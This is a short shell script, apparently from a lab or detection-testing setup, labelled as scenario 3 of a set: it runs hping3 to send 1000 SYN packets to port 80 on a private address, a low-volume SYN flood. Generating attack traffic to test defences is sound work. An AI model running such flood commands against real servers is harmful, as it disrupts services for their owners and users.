#!/bin/sh
# Scenario 3 - denial of service (LOW volume): SYN flood on the web server
# 1000 SYN packets, one every 10 ms (about 100 packets/second, 10 seconds)
hping3 -S -p 80 -i u10000 -c 1000 172.28.0.10
